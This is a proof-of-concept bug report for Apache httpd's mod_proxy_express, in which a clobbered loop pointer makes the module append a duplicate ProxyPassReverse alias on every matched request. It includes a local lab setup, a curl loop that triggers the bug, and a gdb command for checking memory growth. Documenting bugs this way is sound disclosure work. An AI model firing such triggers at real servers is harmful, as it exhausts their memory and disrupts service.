# PoC 155 — Duplicate `ProxyPassReverse` Aliases On Match

`mod_proxy_express` clobbers its loop pointer to `NULL` when an existing
reverse-proxy alias matches, then misreads that as "not found" and
appends a duplicate alias on every translated request.

## Setup

Build a DBM that maps a server name to a backend:

```bash
mkdir -p /tmp/httpd-poc-155 && cd /tmp/httpd-poc-155
cat > map.txt <<'EOF'
host1.example.com  http://127.0.0.1:18001
EOF
/usr/bin/httxt2dbm -i map.txt -o map.dbm
```

Trivial backend:

```bash
python3 -m http.server 18001 --bind 127.0.0.1 \
  --directory /tmp/httpd-poc-155 &
```

`httpd.conf`:

```apache
ServerRoot "/tmp/httpd-poc-155"
PidFile "/tmp/httpd-poc-155/httpd.pid"
ErrorLog "/tmp/httpd-poc-155/error.log"
LogLevel proxy_express:debug

Listen 127.0.0.1:8080

LoadModule mpm_event_module      modules/mod_mpm_event.so
LoadModule authz_core_module     modules/mod_authz_core.so
LoadModule proxy_module          modules/mod_proxy.so
LoadModule proxy_http_module     modules/mod_proxy_http.so
LoadModule proxy_express_module  modules/mod_proxy_express.so

# Pre-existing PPR for the same backend the DBM resolves to.
ProxyPassReverse "/" "http://127.0.0.1:18001"

ProxyExpressEnable on
ProxyExpressDBMFile /tmp/httpd-poc-155/map.dbm
```

## Trigger

```bash
/usr/sbin/httpd -f /tmp/httpd-poc-155/httpd.conf -k start
for i in $(seq 1 50); do
    curl -s -H 'Host: host1.example.com' http://127.0.0.1:8080/ \
         >/dev/null
done
sudo cat /proc/$(pidof httpd | awk '{print $1}')/status | grep VmRSS
```

Then dump the runtime alias array via `gdb`:

```bash
sudo gdb -p $(pidof -s httpd) -batch \
    -ex 'p ((proxy_dir_conf*)dconf)->raliases->nelts'
```

## Observed effect

* `error.log` prints `proxy_express: adding PPR entry` once per request,
  even though the alias for `http://127.0.0.1:18001/` already exists.
* The `nelts` of `dconf->raliases` grows linearly with the number of
  matched requests: `1 -> 2 -> 3 -> …`.
* RSS grows because each alias is allocated from the configuration pool.
* Confirms the `ralias = NULL` clobber and the wrong
  `if (!ralias)` decision at `modules/proxy/mod_proxy_express.c:214`.
